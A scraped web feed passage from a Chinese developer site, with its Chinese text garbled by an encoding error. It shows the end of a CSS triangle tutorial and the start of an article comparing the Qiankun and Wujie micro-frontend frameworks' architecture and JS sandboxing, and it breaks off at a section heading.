<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"triangle-clip"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.triangle-clip</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;
  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#e74c3c</span>;
  <span class="hljs-comment">/* ä¸‰ä¸ªç‚¹çš„åæ ‡åˆ†åˆ«æ˜¯ï¼šé¡¶ç«¯ä¸­é—´ (50% 0%)ï¼Œå·¦ä¸‹è§’ (0% 100%)ï¼Œå³ä¸‹è§’ (100% 100%) */</span>
  <span class="hljs-attribute">clip-path</span>: <span class="hljs-built_in">polygon</span>(<span class="hljs-number">50%</span> <span class="hljs-number">0%</span>, <span class="hljs-number">0%</span> <span class="hljs-number">100%</span>, <span class="hljs-number">100%</span> <span class="hljs-number">100%</span>);
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<hr/>
<h3 data-id="heading-2">æ€»ç»“ä¸å»ºè®®</h3>
<ol>
<li><strong>Border æ–¹æ³•ï¼š</strong> å…¼å®¹æ€§æå¥½ï¼ˆç”šè‡³æ”¯æŒéå¸¸è€çš„æµè§ˆå™¨ï¼‰ï¼Œä½†å¦‚æœä½ éœ€è¦ç»™ä¸‰è§’å½¢åŠ æŠ•å½± (box-shadow) æˆ–æ¸å˜ï¼Œå¤„ç†èµ·æ¥ä¼šæ¯”è¾ƒéº»çƒ¦ã€‚</li>
<li><strong>Clip-path æ–¹æ³•ï¼š</strong> ä»£ç å¯è¯»æ€§å¼ºï¼Œæ”¯æŒå“åº”å¼å¸ƒå±€ï¼Œéå¸¸æ–¹ä¾¿æ·»åŠ èƒŒæ™¯å›¾ç‰‡æˆ–æ¸å˜è‰²ã€‚ç°ä»£æµè§ˆå™¨å‡æ”¯æŒï¼Œæ˜¯ç›®å‰çš„æ¨èåšæ³•ã€‚</li>
</ol>
<p>å¦‚æœä½ éœ€è¦å¿«é€Ÿç”Ÿæˆå„ç§è§’åº¦çš„ä¸‰è§’å½¢ï¼Œå¯ä»¥æœç´¢ <strong>"CSS Triangle Generator"</strong>ï¼Œæœ‰å¾ˆå¤šåœ¨çº¿å·¥å…·å¯ä»¥ç›´æ¥å¯¼å‡ºè¿™äº›ä»£ç ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Qiankun vs Wujieï¼šå¾®å‰ç«¯æ¡†æ¶æ·±åº¦å¯¹æ¯”]]></title>    <link>https://juejin.cn/post/7589159665854890003</link>    <guid>https://juejin.cn/post/7589159665854890003</guid>    <pubDate>2025-12-29T08:27:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589159665854890003" data-draft-id="7589106661442388009" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Qiankun vs Wujieï¼šå¾®å‰ç«¯æ¡†æ¶æ·±åº¦å¯¹æ¯”"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-29T08:27:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å€Ÿä¸ªç«er"/> <meta itemprop="url" content="https://juejin.cn/user/2225067265915783"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Qiankun vs Wujieï¼šå¾®å‰ç«¯æ¡†æ¶æ·±åº¦å¯¹æ¯”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2225067265915783/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å€Ÿä¸ªç«er
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T08:27:00.000Z" title="Mon Dec 29 2025 08:27:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Qiankun vs Wujieï¼šå¾®å‰ç«¯æ¡†æ¶æ·±åº¦å¯¹æ¯”</h2>
<blockquote>
<p>åŸºäº Qiankun 3.0 å’Œ Wujie 1.0.22 æºç æ·±åº¦åˆ†æï¼Œä»æ¶æ„è®¾è®¡ã€éš”ç¦»æ–¹æ¡ˆã€èµ„æºåŠ è½½ã€é€šä¿¡æœºåˆ¶ã€è·¯ç”±å¤„ç†ã€é¢„åŠ è½½ç­–ç•¥ã€æ’ä»¶ç³»ç»Ÿç­‰ç»´åº¦è¿›è¡Œå…¨é¢å¯¹æ¯”ï¼ŒåŠ©ä½ åšå‡ºæœ€ä½³æŠ€æœ¯é€‰å‹ã€‚</p>
</blockquote>
<h3 data-id="heading-1">ä¸€ã€è®¾è®¡å“²å­¦</h3>
<h4 data-id="heading-2">1.1 æ¶æ„ç†å¿µ</h4>



































<table><thead><tr><th>ç»´åº¦</th><th>Qiankun</th><th>Wujie</th></tr></thead><tbody><tr><td>åŸºç¡€æ¶æ„</td><td>åŸºäº single-spa å°è£…</td><td>åŸåˆ›åŒå®¹å™¨æ¶æ„</td></tr><tr><td>éš”ç¦»æ€è·¯</td><td>Proxy ä»£ç†æ¨¡æ‹Ÿéš”ç¦»</td><td>æµè§ˆå™¨åŸç”Ÿéš”ç¦»</td></tr><tr><td>æ ¸å¿ƒæŠ€æœ¯</td><td>Proxy + with + Membrane</td><td>iframe + Shadow DOM + Proxy</td></tr><tr><td>è®¾è®¡ç›®æ ‡</td><td>å¼€ç®±å³ç”¨ã€ç”Ÿæ€å®Œå–„</td><td>æè‡´éš”ç¦»ã€ä½ä¾µå…¥</td></tr><tr><td>åŒ…ç»“æ„</td><td>monorepoï¼ˆsandbox/loader/sharedï¼‰</td><td>å•åŒ…</td></tr></tbody></table>
<h4 data-id="heading-3">1.2 æ¶æ„å›¾å¯¹æ¯”</h4>
<pre><code class="hljs language-javascript" lang="javascript">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                        <span class="hljs-title class_">Qiankun</span> æ¶æ„                              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                  â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚   â”‚                    ä¸»åº”ç”¨ <span class="hljs-title class_">Window</span>                         â”‚   â”‚
â”‚   â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”‚   â”‚
â”‚   â”‚  â”‚  å­åº”ç”¨ A    â”‚  â”‚  å­åº”ç”¨ B    â”‚  â”‚  å­åº”ç”¨ C    â”‚      â”‚   â”‚
â”‚   â”‚  â”‚             â”‚  â”‚             â”‚  â”‚             â”‚      â”‚   â”‚
â”‚   â”‚  â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚  â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚  â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚      â”‚   â”‚
â”‚   â”‚  â”‚ â”‚ <span class="hljs-title class_">Proxy</span>   â”‚ â”‚  â”‚ â”‚ <span class="hljs-title class_">Proxy</span>   â”‚ â”‚  â”‚ â”‚ <span class="hljs-title class_">Proxy</span>   â”‚ â”‚      â”‚   â”‚
â”‚   â”‚  â”‚ â”‚ <span class="hljs-title class_">Sandbox</span> â”‚ â”‚  â”‚ â”‚ <span class="hljs-title class_">Sandbox</span> â”‚ â”‚  â”‚ â”‚ <span class="hljs-title class_">Sandbox</span> â”‚ â”‚      â”‚   â”‚
â”‚   â”‚  â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚  â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚  â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚      â”‚   â”‚
â”‚   â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â”‚   â”‚
â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                              â†“                                   â”‚
â”‚                        single-spa                                â”‚
â”‚                  (è·¯ç”±åŠ«æŒ + ç”Ÿå‘½å‘¨æœŸç®¡ç†)                         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                        <span class="hljs-title class_">Wujie</span> æ¶æ„                                â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                  â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚   â”‚  wujie-app (<span class="hljs-title class_">Web</span> <span class="hljs-title class_">Component</span>)                               â”‚   â”‚
â”‚   â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚   â”‚
â”‚   â”‚  â”‚           <span class="hljs-title class_">Shadow</span> <span class="hljs-variable constant_">DOM</span> â† <span class="hljs-variable constant_">CSS</span> å®Œå…¨éš”ç¦»                â”‚  â”‚   â”‚
â”‚   â”‚  â”‚           å­åº”ç”¨ <span class="hljs-variable constant_">HTML</span>/<span class="hljs-variable constant_">CSS</span> æ¸²æŸ“                      â”‚  â”‚   â”‚
â”‚   â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚   â”‚
â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                              â†‘ <span class="hljs-title class_">Proxy</span> ä»£ç†                        â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚   â”‚  éšè— iframe â† <span class="hljs-variable constant_">JS</span> åŸç”Ÿéš”ç¦»                               â”‚   â”‚
â”‚   â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚   â”‚
â”‚   â”‚  â”‚  å­åº”ç”¨ <span class="hljs-variable constant_">JS</span> è¿è¡Œ                                     â”‚  â”‚   â”‚
â”‚   â”‚  â”‚  ç‹¬ç«‹ <span class="hljs-variable language_">window</span> / <span class="hljs-variable language_">document</span> / location                 â”‚  â”‚   â”‚
â”‚   â”‚  â”‚  <span class="hljs-variable constant_">DOM</span> æ“ä½œé€šè¿‡ <span class="hljs-title class_">Proxy</span> ä»£ç†åˆ° <span class="hljs-title class_">Shadow</span> <span class="hljs-variable constant_">DOM</span>               â”‚  â”‚   â”‚
â”‚   â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚   â”‚
â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h3 data-id="heading-4">äºŒã€JS æ²™ç®±æœºåˆ¶</h3>
<h4 data-id="heading-5">2.1 Qiankunï¼šProxy + Membrane + Compartment</h4>
<p>Qiankun 3.0 é‡‡ç”¨ä¸‰å±‚æ¶æ„å®ç° JS éš”ç¦»ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 1. Membrane å±‚ï¼šProxy ä»£ç†æ‹¦æˆªå±æ€§è®¿é—®</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">handler</span>: <span class="hljs-title class_">ProxyHandler</span>&lt;<span class="hljs-title class_">Window</span>&gt; = {
  <span class="hljs-title function_">get</span>(<span class="hljs-params">target, p</span>) {
    <span class="hljs-keyword">if</span> (p <span class="hljs-keyword">in</span> endowments) <span class="hljs-keyword">return</span> endowments[p].<span class="hljs-property">value</span>;
    <span class="hljs-keyword">if</span> (modifications.<span class="hljs-title function_">has</span>(p)) <span class="hljs-keyword">return</span> modifications.<span class="hljs-title function_">get</span>(p);
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, p);
  },
  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, p, value</span>) {
    <span class="hljs-keyword">if</span> (locked) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// æ²™ç®±é”å®šæ—¶ç¦æ­¢ä¿®æ”¹</span>
    modifications.<span class="hljs-title function_">set</span>(p, value);
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  },
};

<span class="hljs-comment">// 2. Compartment å±‚ï¼šwith è¯­å¥ç»‘å®šä½œç”¨åŸŸ</span>
;(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>){
  <span class="hljs-title function_">with</span>(<span class="hljs-params"><span class="hljs-variable language_">this</span></span>){
    <span class="hljs-keyword">const</span> {<span class="hljs-variable language_">console</span>,<span class="hljs-variable language_">document</span>,...} = <span class="hljs-variable language_">this</span>;  <span class="hljs-comment">// ä¼˜åŒ–å¸¸ç”¨å˜é‡</span>
    <span class="hljs-comment">// å­åº”ç”¨ä»£ç </span>
  }
}).<span class="hljs-title function_">bind</span>(proxyWindow)();

<span class="hljs-comment">// 3. Patchers å±‚ï¼šå‰¯ä½œç”¨ç®¡ç†</span>
<span class="hljs-title function_">patchWindowListener</span>(sandbox);   <span class="hljs-comment">// äº‹ä»¶ç›‘å¬</span>
<span class="hljs-title function_">patchInterval</span>(sandbox);         <span class="hljs-comment">// å®šæ—¶å™¨</span>
<span class="hljs-title function_">patchHistoryListener</span>(sandbox);  <span class="hljs-comment">// History ç›‘å¬</span>
</code></pre>
<p><strong>ç‰¹ç‚¹</strong>ï¼š</p>
<ul>
<li>modifications Map è®°å½•æ‰€æœ‰ä¿®æ”¹ï¼Œæ”¯æŒå¿«ç…§æ¢å¤</li>
<li>é”å®šæœºåˆ¶ï¼šinactive æ—¶ç¦æ­¢ä¿®æ”¹</li>
<li>å‰¯ä½œç”¨è¡¥ä¸ï¼šæ‰‹åŠ¨ç®¡ç†äº‹ä»¶ã€å®šæ—¶å™¨ç­‰</li>
</ul>
<h4 data-id="heading-6">2.2 Wujieï¼šiframe åŸç”Ÿéš”ç¦» + Proxy ä»£ç†</h4>
<p>Wujie åˆ©ç”¨ iframe çš„åŸç”Ÿéš”ç¦»èƒ½åŠ›ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 1. åˆ›å»ºåŒåŸŸ iframeï¼ˆé¿å…è·¨åŸŸï¼‰</span>
<span class="hljs-keyword">const</span> iframe = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">"iframe"</span>);
iframe.<span class="hljs-property">src</span> = mainHostPath;  <span class="hljs-comment">// åŒåŸŸ</span>
iframe.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">"none"</span>;

<span class="hljs-comment">// 2. é˜»æ­¢ iframe åŠ è½½ä¸»åº”ç”¨å†…å®¹</span>
iframeWindow.<span class="hljs-title function_">stop</span>();

<span class="hljs-comment">// 3. IIFE åŒ…è£…è„šæœ¬ï¼Œæ›¿æ¢å…¨å±€å˜é‡</span>
(<span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable language_">window</span>, self, <span class="hljs-variable language_">global</span>, location</span>) {
  <span class="hljs-comment">// å­åº”ç”¨ä»£ç </span>
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">foo</span> = <span class="hljs-string">'bar'</span>;  <span class="hljs-comment">// å®é™…æ“ä½œ proxy</span>
}).<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">__WUJIE</span>.<span class="hljs-property">proxy</span>)(
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">__WUJIE</span>.<span class="hljs-property">proxy</span>,
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">__WUJIE</span>.<span class="hljs-property">proxy</span>,
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">__WUJIE</span>.<span class="hljs-property">proxy</span>,
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">__WUJIE</span>.<span class="hljs-property">proxyLocation</span>,
);

<span class="hljs-comment">// 4. Proxy ä»£ç† document æ“ä½œåˆ° Shadow DOM</span>
<span class="hljs-keyword">const</span> proxyDocument = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>({}, {
  <span class="hljs-title function_">get</span>(<span class="hljs-params">_, propKey</span>) {
    <span class="hljs-keyword">if</span> (propKey === <span class="hljs-string">"getElementById"</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-function">(<span class="hljs-params">id</span>) =&gt;</span> shadowRoot.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">`[id="<span class="hljs-subst">${id}</span>"]`</span>);
    }
    <span class="hljs-comment">// ...</span>
  },
});
</code></pre>
<p><strong>ç‰¹ç‚¹</strong>ï¼š</p>
<ul>
<li>iframe æä¾›å®Œæ•´ç‹¬ç«‹çš„ window å¯¹è±¡</li>
<li>åŸç”Ÿ JS éš”ç¦»ï¼Œæ— éœ€æ¨¡æ‹Ÿ</li>
<li>äº‹ä»¶ã€å®šæ—¶å™¨è‡ªåŠ¨éš”ç¦»ï¼Œæ— éœ€æ‰‹åŠ¨æ¸…ç†</li>
</ul>
<h4 data-id="heading-7">2.3 éš”ç¦»èƒ½åŠ›å¯¹æ¯”</h4>





















































